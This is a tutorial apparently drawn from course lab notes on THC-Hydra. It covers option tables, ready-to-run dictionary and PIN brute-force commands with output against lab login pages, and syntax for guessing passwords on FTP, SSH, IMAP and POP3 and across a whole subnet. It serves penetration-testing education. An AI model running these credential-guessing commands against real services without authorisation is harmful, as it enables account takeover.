# Password Cracking with Hydra (THC-Hydra)

> **Type:** Active Online Attack — brute-force / dictionary attack against live services
> **Pre-installed:** Kali Linux, Parrot OS
> **GitHub:** https://github.com/vanhauser-thc/thc-hydra

---

## Quick Reference — Key Options

| Flag | Description |
|------|-------------|
| `-l LOGIN` | Single known username |
| `-L FILE` | Username wordlist file |
| `-p PASS` | Single known password |
| `-P FILE` | Password wordlist file |
| `-C FILE` | Colon-separated `login:pass` combo file |
| `-x MIN:MAX:CHARSET` | Generate passwords on-the-fly (built-in brute-force) |
| `-s PORT` | Custom service port |
| `-t TASKS` | Parallel threads per target (default: 16) |
| `-T TASKS` | Parallel threads overall (for `-M`, default: 64) |
| `-M FILE` | List of target servers (one per line) |
| `-o FILE` | Write results to file |
| `-f` / `-F` | Stop on first valid credential found (`-f` per host, `-F` global) |
| `-e nsr` | Try `n` (null password), `s` (login as pass), `r` (reversed login) |
| `-v` / `-V` / `-d` | Verbose / show each attempt / debug mode |
| `-R` | Restore a previous aborted session |
| `-S` | SSL connect |
| `-U` | Show module-specific usage details |

### `-x` Charset Codes

| Code | Charset |
|------|---------|
| `a` | Lowercase letters |
| `A` | Uppercase letters |
| `1` | Digits |
| `!` | Special characters |

**Example:** `-x 3:3:1` → all 3-digit numeric PINs (`000`–`999`)

## Practical Examples

### Example 1 — Basic HTTP-GET with Known Credentials (Verification)

```bash
hydra -l root -p password attackdirect.samsclass.info http-get /brute0/
```

**Output:**
```
[80][http-get] host: attackdirect.samsclass.info   login: root   password: password
1 of 1 target successfully completed, 1 valid password found
```

> This is a trivial case — both username and password are known. Useful for testing connectivity and syntax.

---

### Example 2 — Dictionary Attack with rockyou.txt

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt attackdirect.samsclass.info http-get /brute0/
```

**Output:**
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[80][http-get] host: attackdirect.samsclass.info   login: root   password: password
[80][http-get] host: attackdirect.samsclass.info   login: root   password: iloveyou
[80][http-get] host: attackdirect.samsclass.info   login: root   password: 123456
...
1 of 1 target successfully completed, 16 valid passwords found
```

> ⚠️ **False positives:** Hydra may report multiple valid passwords. Always manually verify each result on the actual login page.

---

### Example 3 — HTTP-GET-FORM with Username List + Brute-Force PIN

**Scenario:** Login form at `/brute4.php` with username field `login` and PIN field `pin`. PIN is a 3-digit number. Failed login returns "Denied".

**Step 1:** Create a username list

```bash
cat > usernames.txt
root
admin
administrator
```

**Step 2:** Run Hydra with dynamic brute-force

```bash
hydra -L usernames.txt -x 3:3:1 attack.samsclass.info http-get-form "/brute4.php:login=^USER^&pin=^PASS^:F=Denied"
```

**Breaking down the form syntax:**

| Component | Meaning |
|-----------|---------|
| `/brute4.php` | Form action path |
| `login=^USER^` | HTML input field `login` → Hydra inserts username |
| `pin=^PASS^` | HTML input field `pin` → Hydra inserts password |
| `F=Denied` | **Failure string** — if response contains "Denied", login failed |

> `^USER^` and `^PASS^` are Hydra's placeholder variables. `F=` defines the failure condition (if absent in response, credentials are valid).

## Service-Specific Syntax Examples

```bash
# FTP brute force
hydra -l user -P passlist.txt ftp://192.168.0.1

# SSH with user list and password list
hydra -L logins.txt -P pws.txt -M targets.txt ssh

# IMAP with specific auth method
hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN

# POP3 over SSL/IPv6
hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5

# FTP across entire subnet
hydra -l admin -p password ftp://[192.168.0.0/24]/
```

## HTTP Form Types

| Service String | When to Use |
|----------------|-------------|
| `http-get` | Basic HTTP auth (browser popup) via GET |
| `http-post` | Basic HTTP auth via POST |
| `http-get-form` | HTML form submitting via GET method |
| `http-post-form` | HTML form submitting via POST method (most common, e.g., WordPress) |

> **Tip:** Inspect the form's HTML `action` and `method` attributes to determine which Hydra service string to use. If no `method` is specified, the default is GET.

---

## Key Takeaways

- Hydra is an **online** brute-force tool — it attacks **live login services**, not stored hashes (use Hashcat/John for hashes).
- Modern sites use **rate limiting, IP blocking, CAPTCHA, and account lockouts** to prevent brute-force — Hydra is most effective against older or unprotected endpoints.
- **Brute-force performance depends on CPU speed** — high-end hardware significantly reduces attack time.
- **rockyou.txt** (`/usr/share/wordlists/rockyou.txt`) is the go-to wordlist for dictionary attacks (133 MB, contains millions of leaked passwords).
- Always **manually verify** Hydra's results to filter out false positives.
- Use `-f` to stop after the first valid credential is found.
